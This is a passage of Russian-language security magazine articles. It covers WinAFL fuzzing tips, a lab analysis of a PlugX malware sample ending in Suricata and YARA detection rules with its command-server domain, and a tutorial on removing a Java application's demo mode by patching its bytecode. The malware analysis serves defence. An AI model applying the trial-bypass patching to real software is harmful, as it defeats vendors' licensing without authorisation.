мя прочерками.
   Первая группа — аргументы WinAFL:
 • D — путь к бинарям DynamoRIO;
 • t — максимальный тайм‑аут для одной итерации фаззинга. Если целевая
   функция не выполнится до конца за это время, WinAFL посчитает, что прог‐
  рамма зависла, и перезапустит ее;
 • x — путь к словарю;
 • f — с помощью этого параметра можно передать имя и расширение вход‐
   ного файла программы. Полезно, когда программа решает, как будет пар‐
   сить файл, в зависимости от его расширения.

Вторая группа — аргументы для библиотеки winafl.dll, которая инструмен‐
тирует целевой процесс:
 • coverage_module — модуль для снятия покрытия. Может быть несколь‐
   ко;
 • target_module — модуль с функцией для фаззинга. Может быть только
   один;
 • target_offset — виртуальное смещение функции от базового адреса
   модуля;
 • fuzz_iterations — количество итераций фаззинга между перезапус‐
   ками программы. Чем меньше это значение, тем чаще WinAFL будет
   перезапускать всю программу целиком, что будет занимать дополнитель‐
   ное время. Однако если долго фаззить программу без перезапуска, могут
   накопиться нежелательные побочные эффекты;
 • call_convention — соглашение о вызове. Поддерживаются sdtcall,
  cdecl, thiscall;
 • nargs — количество аргументов функции. This тоже считается за аргу‐
   мент.

Третья группа — путь к самой программе. WinAFL изменит @@ на полный путь
к входному файлу.


ПРОКАЧКА WINAFL — ДОБАВЛЯЕМ СЛОВАРЬ
Наша цель простая — увеличить количество путей, находимых за секунду.
Для этого ты можешь распараллелить работу фаззера, поиграть с числом
fuzz_iterations или попробовать фаззить умнее. И в этом тебе поможет
словарь.
   WinAFL умеет восстанавливать синтаксис формата данных цели (нап‐
ример,  AFL  смог   самостоятельно   создать   валидные  JPEG-файлы
без какой‑либо дополнительной инфы). Обнаруженные синтаксические еди‐
ницы он использует для генерации новых кейсов для фаззинга. Это занимает
значительное время, и здесь ты можешь ему сильно помочь, ведь кто, как не
ты, лучше всего знает формат данных твоей программы? Для этого нужно
составить словарь в формате <имя переменной>="значение". Например,
вот начало моего словаря:


x0="ProgVer"
x1="WrittenByVersion"
x2="FileType"
x3="Created"
x4="Modified"
x5="Name"
x6="Core"

Итак, мы нашли функцию для фаззинга, попутно расшифровав входной файл
программы, создали словарь, подобрали аргументы и можем наконец‑то
начать фаззить!





И первые же минуты фаззинга приносят первые краши! Но не всегда все про‐
исходит так гладко. Ниже я привел несколько особенностей WinAFL, которые
могут тебе помочь (или помешать) отладить процесс фаззинга.


ОСОБЕННОСТИ WINAFL
Побочные эффекты
Вначале я писал, что функция для фаззинга не должна иметь побочных
эффектов. Но это в идеале. Часто бывает так, что разработчики забывают
добавить в свои программы такие красивые функции, и приходится иметь
дело с тем, что есть.
   Так как некоторые эффекты  накапливаются, возможно, тебе  удастся
успешно пофаззить, уменьшив число fuzz_iterations — так WinAFL будет
перезапускать твою программу чаще. Это негативно повлияет на скорость,
но зато уменьшит количество побочных эффектов.


Дебаг-режим
Если WinAFL отказывается работать, попробуй запустить его в дебаг‑режиме.
Для этого добавь параметр -debug к аргументам библиотеки инструмен‐
тации. После этого в текущем каталоге у тебя появится текстовый лог.
При нормальной работе в нем должно быть одинаковое количество строчек
In pre_fuzz_handler и In post_fuzz_handler. Также должна присутство‐
вать фраза Everything appears to be running normally.





Не забудь выключить дебаг‑режим! С ним WinAFL откажется фаззить, даже
если все  работает, ссылаясь на  то, что целевая программа  вылетела
по тайм‑ауту. Не верь ему и выключай отладку.


Эмуляция работы WinAFL
Иногда при фаззинге программу так перемыкает, что она крашится даже
на подготовительном этапе работы WinAFL, после чего он разумно отказыва‐
ется действовать дальше. Чтобы хоть как‑то в этом разобраться, ты можешь
вручную  эмулировать работу  фаззера. Для  этого ставь  точку  останова
на начало и конец функции для фаззинга. Когда выполнение достигнет конца
функции, правь аргументы, равняй стек, меняй RIP/EIP на начало функции —
и так, пока что‑то не сломается.


Стабильность
Stability — очень важный параметр. Он показывает, насколько карта покрытия
кода меняется от итерации к итерации. 100% — на каждой итерации прог‐
рамма ведет себя абсолютно одинаково. 0% — каждая итерация полностью
отличается от предыдущей. Разумеется, нам нужно значение где‑то посере‐
дине. Автор AFL решил, что ориентироваться надо где‑то на 85%. В нашем
примере стабильность держится на уровне 9,5%. Полагаю, это может быть
связано в том числе с тем, что программа собрана статически и на стабиль‐
ность негативно влияют какие‑то из используемых библиотечных функций.
Возможно, и мультипоточность тоже повлияла на это.


Набор входных файлов
Чем больше покрытие кода, тем выше шанс найти баг. А максимального пок‐
рытия кода можно добиться, создав хороший набор входных файлов. Если ты
задался целью пофаззить парсеры файлов каких‑то хорошо известных фор‐
матов, то, как говорится, гугл в помощь: некоторым исследователям уда‐
валось собрать внушительный набор файлов именно с помощью парсинга
выдачи Google. Такой набор потом можно минимизировать с помощью
скрипта winafl-cmin.py из того же репозитория WinAFL. А если ты, как и я,
предпочитаешь парсилки файлов проприетарных форматов, то поисковик
не так часто будет способен помочь. Приходится посидеть и поковыряться
в программе, чтобы нагенерировать набор интересных файлов.


Отучаем программу ругаться
Моя программа довольно многословна и ругалась на неверный формат вход‐
ного файла, показывая всплывающие сообщения.





Такие проблемы ты легко сможешь вылечить, пропатчив используемую прог‐
раммой библиотеку или саму программу.
ВЗЛОМ
ВСКРЫТИЕ
ПОКАЖЕТ

  АНАЛИЗИРУЕМ
  МАЛВАРЬ
  В СОБСТВЕННОЙ
  ЛАБОРАТОРИИ





       rayhunt454
  grigadan454@gmail.com





С самого детства нам прививают важные и полезные при‐
вычки: мыть руки перед едой, надевать на морозе подштан‐
ники шапку, запускать исследуемую малварь исключительно
в    виртуальном   окружении.   Тестовая   лаборатория
для безопасного изучения вредоносных программ у нас уже
есть. Теперь давай исследуем вредоносный файл семейства
PlugX,  рассмотрим  процесс  анализа  модулей,  изучим
сетевое взаимодействие и разработаем сигнатуры для его
детекта.


             INFO

                 О том, как из подручных материалов с помощью
                            смекалки и умелых рук  построить  скворечник
                        лабораторию для анализа вредоносов, подробно
                            рассказано в статье «Код под надзором. Создаем
                           виртуальную лабораторию для анализа малвари».


Стенд, который мы с тобой собрали в прошлый раз, позволяет быстро иссле‐
довать обнаруженный вредоносный файл, создавать собственные сигнатуры
и выявлять зараженные компьютеры в локальной сети. Сетевую сигнатуру мы
будем писать для Suricata IDS, а файловую — для многоплатформенной прог‐
раммы YARA.
   Исследуемый модуль PlugX содержит три файла: исполняемый файл и две
динамические библиотеки, в одной из которых сосредоточена основная вре‐
доносная функциональность.


           WARNING

                        Прежде чем начать исследование вредоносного
                           файла, необходимо  сделать снимок состояния
                           виртуальных машин с Kali Linux и Windows 10,
                           чтобы в любой момент можно было вернуться к их
                         первоначальным настройкам.



ИНСТРУМЕНТАРИЙ
Многие  описываемые  в  статье  утилиты  находятся  в  каталоге  FLARE
на рабочем столе виртуальной машины с Windows 10. Для дальнейшего
исследования вредоносного файла воспользуемся следующим софтом:
 1. DIE — программа для определения типов файлов.
 2. PeStudio — программа для поиска артефактов исполняемых файлов.
 3. IDA Pro — интерактивный дизассемблер, используемый для реверс‑инжи‐
   ниринга.
 4. Wireshark — инструмент для анализа сетевых протоколов.
 5. Burp  Suite —  используется в  качестве  прозрачного  прокси‑сервера
   для анализа взаимодействия вредоносного файла по протоколу HTTPS.
 6. SELKS — система мониторинга сетевой безопасности на основе стека
   Elasticsearch, Kibana, Logstash, Suricata.
 7. Loki Scanner — сканер IOCs.
 8. YARA Editor — программа для тестирования и создания правил YARA.
 9. ApiLoger — утилита для анализа вызываемых WinAPI-функций исследуемо‐
   го вредоноса.

Анализ вредоносного модуля мы будем проводить в три этапа:
 1. Статический анализ.
 2. Поведенческий анализ.
 3. Создание сигнатур для выявления модуля.


СТАТИЧЕСКИЙ АНАЛИЗ
Чтобы узнать, какой компилятор и компоновщик использовался при создании
нашего исполняемого файла, а также определить, упакован он или нет, скор‐
мим его утилите DIE.





             Анализ исполняемого файла с помощью утилиты DIE

Тулза утверждает, что исследуемый файл разработан на C/C++ и собран
для 32-разрядных операционных систем. Теперь пропустим бинарник через
утилиту PeStudio, чтобы найти всевозможные артефакты. Среди них нам осо‐
бенно интересны временные метки компиляции файла, загружаемые биб‐
лиотеки, используемые ресурсы, информация о версии исполняемого файла,
характерные  строки, а  также  отладочная информация и файл  сборки
(Manifest). Все это пригодится нам при создании файловой сигнатуры.
   Итак, при поиске строк мы обнаружили информацию о загружаемой биб‐
лиотеке и функции вызова.





                  Найденные строки в исполняемом файле

В столбце value отображается строка Goshawk.dll, которая сигнализирует
об использовании некой динамической библиотеки. Строка ServerEntryFun
содержит информацию о функции экспорта.
   Закинем исследуемый файл в IDA Pro, найдем строку Goshawk.dll и учас‐
ток кода, в котором происходит загрузка динамической библиотеки. Для это‐
го перейдем в раздел Views → OpenSubviews →  Strings, найдем  строку
Goshawk.dll, нажмем клавишу X, чтобы перейти непосредственно к коду заг‐
рузки либы, и декомпилируем этот код нажатием клавиши F5.





         Участок кода загрузки динамической библиотеки Goshawk.dll

В  дизассемблерном  листинге  обнаруживаются  строки  ServerEntyFun
и Goshawk.dll. Они пригодятся нам при написании файловой сигнатуры.
   Как  мы  знаем,  основная  функциональность  модуля  расположена
в динамической библиотеке. Настало время ее проанализировать — заг‐
рузим библиотеку в DIE, чтобы определить компилятор и компоновщик.





          Анализ динамической библиотеки с помощью утилиты DIE

Теперь по традиции посмотрим, что скажет о нашей библиотеке PeStudio.





                        Используемые библиотеки

Как видно из скриншота, вредонос использует библиотеку ws32_32.dll, пред‐
назначенную для сетевых подключений TCP/IP, а также динамическую биб‐
лиотеку vtcp.dll. На вкладке Strings обнаруживаем следующее.



               Найденные строки в динамической библиотеке

Файл Debug.log используется для записи ошибок в результате работы вре‐
доносного файла.
   Далее загрузим исследуемый файл в IDA Pro и посмотрим участки кода.
Так как мы исследуем динамическую библиотеку, то в первую очередь изучим
функции экспорта, для этого нужно перейти на вкладку Exports.



                     Используемые функции экспорта

Нажмем два раза функцию ServerEntryFun и исследуем ее код.





                        Участок кода функции экспорта

Как видим, функция CreateThread создает поток, который выполняется
в пределах виртуального адресного пространства вызывающего процесса.
Параметр StartAddress  указывает на адрес  функции,  выполняющейся
в запущенном потоке. В этой функции содержится код расшифровки кон‐
фигурации модуля и код шифрования сетевого взаимодействия с управля‐
ющим сервером.


ПОВЕДЕНЧЕСКИЙ АНАЛИЗ
Проведем поведенческий  анализ, а именно  рассмотрим, какой  трафик
генерирует вредоносный файл. Для этого обратимся к виртуальной машине
с Kali Linux, запустим Inetsim для эмуляции интернет‑сервисов и Burp Suite
для получения HTTPS-трафика. Еще нам понадобится Wireshark, чтобы про‐
анализировать весь трафик с хоста Windows 10.
   Запустим  на  виртуальной машине Windows 10  вредоносный  файл,
а затем — утилиту ApiLogger из подпапки Utilites каталога FLARE.




                        Результат работы утилиты ApiLogger

Функция gethostbyname получает IP-адрес для домена www.dicemention.
com, DNS-сервер, развернутый с помощью Inetsim, резолвит домен по адре‐
су 10.10.10.1 (адрес виртуальной машины Kali Linux). Далее создается сокет
для взаимодействия с хостом 10.10.10.1 (IP-адрес виртуальной машины Kali
Linux) по порту 443. Функция send, реализованная в динамической библиоте‐
ке ws2_32.dll, отправляет данные размером 22 байта.
   Переходим в IDA Pro на вкладку Imports и находим эту функцию.





                         Список функций импорта

Отыщем участок кода, который отвечает за сетевое взаимодействие. Глу‐
бокие раскопки этого кода займут слишком много времени, а наша задача —
изучить его функциональность и разработать сигнатуры. Весь алгоритм шиф‐
рования сетевого взаимодействия основан на двух этапах: расшифровке
заголовка, который содержит информацию о размере сжатых данных, и рас‐
шифровке собственно самих передаваемых данных.
   Просмотрим сетевой трафик и данные, полученные в Burp Suite на вир‐
туальной машине с Kali Linux.



                             DNS-запрос

В сетевом трафике мы обнаружили запрос на получение доменного имени
управляющего сервера. Посмотрим генерируемый трафик по порту 443.
Исследуемый модуль не использует протокол HTTPS, поэтому отключим Burp
Suite и запустим nc (netcat — утилита командной строки для чтения и записи
сетевых данных по протоколу TCP и UDP-данных).
  На виртуальной машине  Kali Linux выполним команду nc  -lvnp  443
и ждем данные от вредоносного файла.





               Данные, отправляемые на управляющий сервер

Информация, которую вредонос передает на управляющий сервер, показана
на скриншоте выше.
  На данном этапе мы разобрали функциональность исследуемого модуля,
изучили сетевое  взаимодействие с управляющим сервером. С исполь‐
зованием полученных строк, характерных для вредоносного файла, и домена
управляющего сервера мы разработаем сигнатуры для поиска скомпромети‐
рованных компьютеров.


СОЗДАНИЕ СИГНАТУР
Для выявления деятельности вредоноса в сети разработаем сетевую сиг‐
натуру. При реагировании на инцидент, особенно когда у нас отсутствуют
средства обнаружения атак, необходимо исследовать трафик, чтобы найти
зараженные компьютеры. Можно записать трафик и  отфильтровать его
по известным доменам и IP-адресам, но я советую использовать програм‐
мное обеспечение с открытым исходным кодом.
  Для этих целей подходит стек ELK (Elasticsearch + Kibana) и Suricata.
SELKS — это бесплатная платформа IDS/IPS для мониторинга сетевой
безопасности на основе Debian. Информация об установке и загрузке правил
есть на гитхабе. Для поиска малвари на скомпрометированных компьютерах
можно воспользоваться YARA-движком.


Создание сигнатуры для Suricata IDS
Создадим alert — правило для сигнализации о сетевой активности вре‐
доносного файла.


                        Hex-значение DNS-пакета

Правило будет выглядеть так:


alert dns any any -> any 53 (msg:"MALWARE Observed DNS Query to
Known malware PlugX www[.]dicemention[.]com domain"; sid: 1000001;
classtype: "malware"; dns_query; content: "dicemention.com";
reference:url,www.virustotal.com/gui/file/
d3bd436119af73a1e9a2ae5360ef38c81031f6f9f2b5f389416aaeafd902e3bd/
details;)

Загрузим это правило в SELKS и протестируем на записанном трафике.





   Результат работы сетевого правила для детектирования вредоносного
  файла

Наше правило сработало, и мы выявили активность малвари на компьюте‐
ре 10.10.10.2. Следующим этапом необходимо исследовать зараженный
компьютер и обнаружить сам вредоносный файл.
   Пока что мы создали только сетевую сигнатуру на вредоносный домен,
но этого условия недостаточно. Необходимо получить IP-адрес DNS-записи
и  создать  дополнительное  правило на  IP-адрес. При  взаимодействии
зараженного компьютера с управляющим сервером запись DNS хранится
в кеше, а взаимодействие устанавливается именно по IP-адресу.


Создание правила YARA
Правило YARA — это инструмент, позволяющий выявлять образцы вредонос‐
ных программ и находить их расположение на скомпрометированных компь‐
ютерах. Сначала создадим сигнатуру для исполняемого файла, а затем
для динамической библиотеки, в которой расположена основная функци‐
ональность вредоносного модуля.
   Документация по созданию правил YARA представлена здесь.
  При создании правил YARA нужно обращать внимание на следующие объ‐
екты:
 • строки, характерные для исследуемого модуля или семейства вредонос‐
   ных программ;
 • мьютексы;
 • ключи реестра;
 • файлы отладочной информации;
 • подключаемые библиотеки;
 • одинаковые участки кода, характерные для семейства вредоносных прог‐
   рамм.


             INFO

                     Для автоматизации создания правила на основе
                         фрагмента исполняемого кода пригодится полез‐
                     ный плагин mkYARA.


Запустим YARA Editor, перейдем на вкладку Editor, загрузим пустой файл
и начнем писать сигнатуру.


rule PlugX_downloader
{
  meta:
    maltype = "PlugX"
    description = "Search for a malicious downloader PlugX"
  strings:
    $dll="Goshawk.dll" nocase
    $str1="Goshawk v2.1"
    $chunk_1 = {53 65 72 76 65 72 45 6e 74 72 79 46 75 6e 00}
  condition:
    uint16 (0) == 0x5A4D and $dll and $str1 and  $chunk_1
}

В разделе meta содержится описание разработанного правила. В разделе
strings находятся строки, обнаруженные в результате исследования вре‐
доносного  файла. В переменной $dll — информация о  загружаемой
динамической библиотеке, $str1 — строка информации об исполняемом
файле. Переменная $chunk_1 содержит шестнадцатеричное значение запус‐
каемой функции экспорта ServerEntryFun. В разделе condition описыва‐
ется условие поиска указанных строк в файле.
  Для детектирования вредоносной библиотеки мы напишем следующее
правило.


rule PlugX_dll
{


  meta:
    maltype = "PlugX"
    description = "Search for a malicious dll PlugX"


  strings:
    $str1 = "WS2_32.dll" nocase // use library
    $str2 = "vtcp.dll" nocase // backdoor dll
    $str3 = "ServerEntryFun" // Function export
    $str4 = "Debug.log" // File Debug.log to record errors
  condition:
    uint16 (0) == 0x5A4D and all of them


}

В правило YARA для динамической библиотеки мы добавили строки, содер‐
жащие информацию о либе ws2_32.dll, которую  малварь  использует
для сетевого взаимодействия, подгружаемой библиотеке vtcp.dll, исполь‐
зуемой функции ServerEntryFun и обнаруженном нами файле Debug.log.
   Протестируем разработанные сигнатуры. Для этого переходим ко вкладке
test → Test items, нажимаем кнопку Folder и выбираем каталог, в котором рас‐
положены вредоносные модули. После нажатия кнопки Scan  items YARA
Editor начинает искать файлы по тестируемым сигнатурам.





               Тестирование работоспособности правил YARA

На скриншоте видно, что в результате сканирования были обнаружены вре‐
доносные файлы семейства PlugX, содержащие строки из наших YARA-пра‐
вил.


             INFO

                     Для поиска в файловой системе вредоносных
                         файлов на основе IOCs можно использовать ути‐
                         литу Loki Scanner, в которую есть возможность
                          добавлять правила YARA и хеш‑суммы модулей.



ЗАКЛЮЧЕНИЕ
Мы провели статический и поведенческий анализ вредоносного файла и соз‐
дали сигнатуры для детектирования его модуля. С помощью собранной ранее
лаборатории мы смогли быстро исследовать малварь и разработать собс‐
твенные индикаторы компрометации. Дальнейшие этапы при расследовании
инцидентов — обнаружить зараженные компьютеры, найти точку входа зло‐
умышленников в сеть, а также методы закрепления в системе и бокового
перемещения. Но эти шаги выходят за рамки сегодняшней статьи.
ВЗЛОМ
 ГРЯЗНЫЙ
     ДЖО

                ВЗЛАМЫВАЕМ JAVA-
                    ПРИЛОЖЕНИЯ
                    С ПОМОЩЬЮ
                              DIRTYJOE





                                                                МВК





Способы обхода триала в различных программах — одна
из самых интересных тем прикладного реверс‑инжиниринга,
и я уже не раз посвящал ей свои статьи. Настало время вер‐
нуться к этой тематике снова. Наш сегодняшний пациент —
приложение, выполненное в виде JAR-модуля, которое мы
исследуем без полного реверса и пересборки проекта.


           WARNING

                        Статья имеет ознакомительный характер и пред‐
                          назначена для  специалистов по безопасности,
                          проводящих тестирование в рамках  контракта.
                       Автор  и  редакция  не  несут  ответственности
                        за любой вред,  причиненный с  применением
                          изложенной информации. Распространение вре‐
                         доносных программ, нарушение работы систем
                      и  нарушение  тайны  переписки  преследуются
                      по закону.


В  заметке  «В  обход  стражи.  Отлаживаем  код  на  PHP,  упакованный
SourceGuardian» мы  рассматривали  программу,  реализованную  в виде
локального веб‑интерфейса. Работает она так: под Windows запускается
локальный сервер Apache c набором PHP-модулей, а пользователь взаимо‐
действует с  приложением через  браузер,  в котором  набирает адрес
localhost. Программа, взломом которой мы займемся сегодня, действует
похожим образом, только написана она на Java и поставляется в виде файла
.JAR. Наша задача — отучить приложение от деморежима.
  По счастью, нам известно, где лежат стартующие в виде сервиса исполня‐
емые модули программы в формате .EXE и соответствующий JAR-файл.
По своей сути JAR — это обычный ZIP-архив, в который упакованы части про‐
екта. Поскольку мы собираемся править код, нас интересуют модули *.
CLASS, содержащие  откомпилированный  JVM-байт‑код.  Декомпиляторов
и способов их применения множество, существуют даже инструменты вроде
JD-GUI, способные полностью восстановить проект из исполняемого файла.
Чаще всего взломщики используют общеизвестный JAD, который из‑за его
распространенности ловкие обфускаторы давно научились обманывать, что,
в свою очередь, стало причиной появления более продвинутых декомпилято‐
ров вроде CFR. Эта война щитов и мечей, пуль и бронежилетов обещает быть
долгой, нам остается только запастись попкорном. Но не будем тут останав‐
ливаться, а вместо этого предположим, что мы декомпилировали проект
одним из описанных способов до Java-исходников и даже проанализировали
полученный код.
   Применительно к нашему подопытному приложению это выглядело при‐
мерно так. Декомпилировав все‑все‑все CLASS-файлы, мы так и не обна‐
ружили ничего похожего на обращение к лицензии, однако в подкаталоге
BOOT-INF/lib нашего JAR-архива нашлось множество упакованных JAR-биб‐
лиотек, среди которых сразу бросилась в глаза библиотека license-1.2.12.
jar. Распаковав и декомпилировав ее, мы наткнулись на два CLASS-модуля,
содержащих две любопытные функции. Одна возвращает демонстрационный
режим, вторая активирует опцию 1 по умолчанию:


public boolean isDemo() {
  return this.getPublicDataHash().isEmpty();
}


public void setDefault() {
  if (this.hasModule(1)) {
    Iterator iter = this.modulesItems.entrySet().iterator();
    while (iter.hasNext()) {
      Map.Entry item = iter.next();
      if ((Integer)item.getKey() == 1) continue;
      ((BaseModule)item.getValue()).close();
      iter.remove();
      this.onModuleUpdated((Integer)item.getKey());
    }
  } else {
    this.closeModules();
    if (!this.modulesConfig.containsKey(1)) {
      return;
    }
    BaseModule mod = this.getModule(1);
    if (mod != null) {
      mod.setEnabled(true);
      this.modulesItems.put(1, mod);
      log.info("Default module loaded {}", (Object)mod.getName());
      this.onModuleUpdated(1);
    }
  }
}

Наша задача — сделать так, чтобы функция isDemo всегда возвращала false,
а в функции setDefault нужно заменить опцию 1 опцией 256. Вот здесь
и начинается самое интересное, то, ради чего и написана эта статья.
  Ты спросишь: раз у нас имеются в наличии все исходники и код, то
почему бы просто не перекомпилировать весь проект, поменяв эти две про‐
цедуры на нужные? К сожалению, прямой метод не всегда самый простой.
В нашем случае в интересующих нас модулях много зависимостей, а проект
очень большой, многие модули сильно обфусцированы. Кроме того, код вос‐
становился  частично  с  кучей  ошибок,  из‑за  чего  проект  полностью
не соберется. Можно, конечно, покопать обфускацию и попробовать руками
вытащить исходный текст программы, но решать эту (возможно, даже, гораз‐
до более сложную) задачу ради двух простых патчей в коде как‑то лень. Вдо‐
бавок пересборке проекта может помешать отсутствие установленного JDK
на компьютере. Устанавливать его и разбираться в особенностях компиляции
Java-проектов мне тоже неохота. Поэтому мы, как обычно, ищем самый прос‐
той путь — патч откомпилированного JVM-кода.
  В этом нам поможет интересная, но малоизвестная утилита dirtyJOE.
Открываем в ней наш CLASS-модуль, на вкладке Methods видим полный спи‐
сок методов класса. Находим в нем искомую isDemo и тыкаем в нее, открывая
окно редактирования.





                       Окно редактирования dirtyJOE

Это, конечно, не исходник на Java, но здесь хотя бы можно редактировать
байт‑код, сверяясь с логикой исходника. Возможности программы минима‐
листичны: редактировать можно только в виде hex-значений кодов инструк‐
ций. По счастью, мнемоника и описание текущей исправленной инструкции
отображается в окошке над окном кода, а сам список инструкций с описани‐
ем каждой имеется в хелпе (причем только список, без опкодов: явно, чтобы
хакерам жизнь медом не казалась и пришлось искать шестнадцатеричные
опкоды инструкций самостоятельно). По сути, нам надо закоротить данную
функцию, сделав возвращаемым значением 0 (false). Находим в таблице
инструкцию помещения 0 на стек  (iconst_0), ее опкод  (3) и ставим ее
в самое начало метода, а после нее — сразу возврат (ireturn).





                          Исправляем инструкцию

Закрываем окно редактирования, сохраняем CLASS-модуль, затем меняем
исправленный модуль в архиве license-1.2.12.jar, который, в свою оче‐
редь, копируем на место старого в основном JAR-модуле. С предвкушением
перезапускаем программу и обнаруживаем, что она не работает. Мы что‑то
сделали не так.
  Для понимания сути проблемы надо искать логи программы. По счастью,
любое Java-приложение практически всегда пишет свой системный лог, при‐
чем не один. В нашем случае в логе присутствует вот такая ошибка:



  Caused by: java.lang.IllegalStateException: Unable to open nested entry
  'BOOT-INF/lib/license-1.2.12.jar'. It has been compressed and nested jar
  files must be stored without compression. Please check the mechanism
  used to create your executable jar file


Теперь все ясно: для успешного чтения библиотеки Java требуется файл
с нулевой компрессией. Оно и понятно — зачем сжимать уже компрес‐
сированный файл? Что ж, сохраняем данную библиотеку с нулевой компрес‐
сией, перезапускаем — снова неудача. Ошибка в журнале на этот раз вооб‐
ще невразумительная, исходя из ее логики, сама библиотека license-1.2.
12.jar собрана как‑то неправильно. Безрезультатно помаявшись некоторое
время c разными архиваторами, делаем логичное предположение, что проб‐
лема кроется в архиваторе, которым мы собираем файл библиотеки. Ска‐
чиваем родной сборщик jar.exe из пакета JDK и пробуем собрать файл
с его помощью. В итоге получаем новую ошибку:


"C:\Program Files\Java\jdk-17.0.1\bin\jar.exe" -u -f license-1.2.12.
jar com\license\service\LicenseHandler.class




                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИВЗЛОМ
      ГРЯЗНЫЙ ДЖО
                ВЗЛАМЫВАЕМ JAVA-ПРИЛОЖЕНИЯ
                       С ПОМОЩЬЮ DIRTYJOE





  java.util.zip.ZipException: duplicate entry: META-
  INF/maven/org.slf4j/slf4j-api/pom.properties
  at
  java.base/java.util.zip.ZipOutputStream.putNextEntry(ZipOutputStream.jav
  a:241)
  at
  java.base/java.util.jar.JarOutputStream.putNextEntry(JarOutputStream.jav
  a:115)
  at jdk.jartool/sun.tools.jar.Main.update(Main.java:961)
  at jdk.jartool/sun.tools.jar.Main.run(Main.java:338)
  at jdk.jartool/sun.tools.jar.Main.main(Main.java:1665)


Внезапная проблема возникла на ровном месте: казалось бы, простейшую
операцию сборки файлов в один архив не может проделать корректно
ни один виндовый архиватор, включая родной сборщик JAR. Разгадка проста:
архиваторы работают с модулями как с обычными файлами, у которых регис‐
тронезависимые имена. А имена Java-классов вполне себе регистрозави‐
симые, и хитрые обфускаторы давно просекли эту лазейку, переименовывая
модули. В итоге проект содержит множество классов, отличающихся только
регистром одной или более букв в названии. По счастью, данная проблема
отсутствует у раритетных консольных архиваторов вроде ZIP или PKZIP,
которые в режиме update могут обновлять JAR-модули с регистрозависимы‐
ми именами. Итак, находим PKZIP, заменяем модуль через него, запускаем —
и снова неудача! На этот раз ошибка в логе выглядит примерно так:



  Constructor threw exception; nested exception is java.lang.VerifyError:
  Expecting a stack map frame
  Exception Details:
  Location:
  com/license/service/type/LicenseData.isDemo()Z @2: nop
  Reason:
  Error exists in the bytecode
  Bytecode:
  0x0000000: 03ac 0015 b600 16ac


В чем смысл данной ошибки? Чтобы понять это, немного углубимся в теорию.
Как известно, Java, так же как и .NET, для оптимизации работы не просто
интерпретирует свой байт‑код, а компилирует его в натив во время выпол‐
нения. Этот процесс называется компиляцией just in time, или JIT, в одной
из своих предыдущих статей я рассказывал о нем применительно к дотнету.
Начиная с 7-й версии Java ввела более строгую проверку и немного изме‐
нила формат класса — чтобы содержать карту стека, используемую для про‐
верки  правильности  кода.  Данная  ошибка  возникает при  компиляции
байт‑кода метода isDemo: первые две инструкции, которые мы исправили,
компилируются успешно, а вот следующая за ними по смещению 2 от начала
метода (nop или опкод 0) вызывает ошибку верификации, поскольку у нее нет
допустимой соответствующей карты стека.
  По идее, в качестве обходного пути можно было бы добавить -noverify
в  аргументы JVM,  чтобы  отключить  проверку. В  Java 7  также -XX:-
usesplitverifier позволяла использовать менее строгий метод проверки,
но эта опция была удалена в Java 8. Разумеется, это не наш метод, ведь мы
хотим получить после патча работоспособный код безо всяких костылей, тем
более наша задача, как я уже говорил, стартует в качестве службы. Попробу‐
ем разобраться, как происходит верификация.
   Компилятор разбивает байт‑код метода на участки по операциям ветвле‐
ния. Контрольные точки находятся или сразу за операторами безусловных
переходов  (возвратов и  прочих  тупиковых  веток  кода), или в  местах,
на которые есть переходы. В этих точках контролируется состояние стека.
Поскольку логика метода isDemo настолько линейна, что для ее верификации
компилятор даже не стал заводить карту стека, то для примера возьмем дру‐
гую процедуру, которую нам требуется поправить, — setDefault. Код ее пос‐
ле компиляции в JVM команды выглядит вот так:


0: aload_0
  1: iconst_1
  2: invokevirtual #51        // Method hasModule:(I)Z
  5: ifeq          101
  8: aload_0
  9: getfield      #4         // Field modulesItems:Ljava/util/
concurrent/ConcurrentMap;
 12: invokeinterface #20,  1  // InterfaceMethod java/util/
concurrent/ConcurrentMap.entrySet:()Ljava/util/Set;
 17: invokeinterface #21,  1  // InterfaceMethod java/util/Set.
iterator:()Ljava/util/Iterator;
 22: astore_1
 23: aload_1                  // Первая контрольная точка: начало
цикла, пункт назначения безусловного перехода из #58, #95, стек
пуст, локальная переменная iter класса iterator
 24: invokeinterface #22,  1  // InterfaceMethod java/util/Iterator.
hasNext:()Z
 29: ifeq          98
 32: aload_1
 33: invokeinterface #23,  1  // InterfaceMethod java/util/Iterator.
next:()Ljava/lang/Object;
 38: checkcast     #24        // class java/util/Map$Entry
 41: astore_2
 42: aload_2
 43: invokeinterface #46,  1  // InterfaceMethod java/util/Map$Entry.
getKey:()Ljava/lang/Object;
 48: checkcast     #47        // class java/lang/Integer
 51: invokevirtual #48        // Method java/lang/Integer.intValue:()
I
 54: iconst_1
 55: if_icmpne     61
 58: goto          23
 61: aload_2                  // Вторая контрольная точка: сюда есть
условный переход из #55, стек пуст, дополнительно к предыдущей
локальная переменная Map.Entry item
 62: invokeinterface #25,  1  // InterfaceMethod java/util/Map$Entry.
getValue:()Ljava/lang/Object;
 67: checkcast     #8         // class com/license/modules/BaseModule
 70: invokevirtual #44        // Method com/license/modules/
BaseModule.close:()V
 73: aload_1
 74: invokeinterface #45,  1  // InterfaceMethod java/util/Iterator.
remove:()V
 79: aload_0
 80: aload_2
 81: invokeinterface #46,  1  // InterfaceMethod java/util/Map$Entry.
getKey:()Ljava/lang/Object;
 86: checkcast     #47        // class java/lang/Integer
 89: invokevirtual #48        // Method java/lang/Integer.intValue:()
I
 92: invokespecial #49        // Method onModuleUpdated:(I)V
 95: goto          23
 98: goto          171        // Третья контрольная точка: мало того
что следует за глухим безусловным переходом, вдобавок есть условный
переход из #29, стек пуст, локальные переменные отсутствуют
101: aload_0                  // Четвертая контрольная точка:
следует за глухим безусловным переходом, конец цикла #5, стек пуст,
локальные переменные те же
102: invokespecial #52        // Method closeModules:()V
105: aload_0
106: getfield      #7         // Field modulesConfig:Ljava/util/Map;
109: iconst_1
110: invokestatic  #10        // Method java/lang/Integer.valueOf:(I)
Ljava/lang/Integer;
113: invokeinterface #27,  2  // InterfaceMethod java/util/Map.
containsKey:(Ljava/lang/Object;)Z
118: ifne          122
121: return
122: aload_0                  // Пятая контрольная точка: сюда
условный переход из #118, стек пуст, локальные переменные те же
123: iconst_1
124: invokespecial #53        // Method getModule:(I)Lcom/license/
modules/BaseModule;
127: astore_1
128: aload_1
129: ifnull        171
132: aload_1
133: iconst_1
134: invokevirtual #54        // Method com/license/modules/
BaseModule.setEnabled:(Z)V
137: aload_0
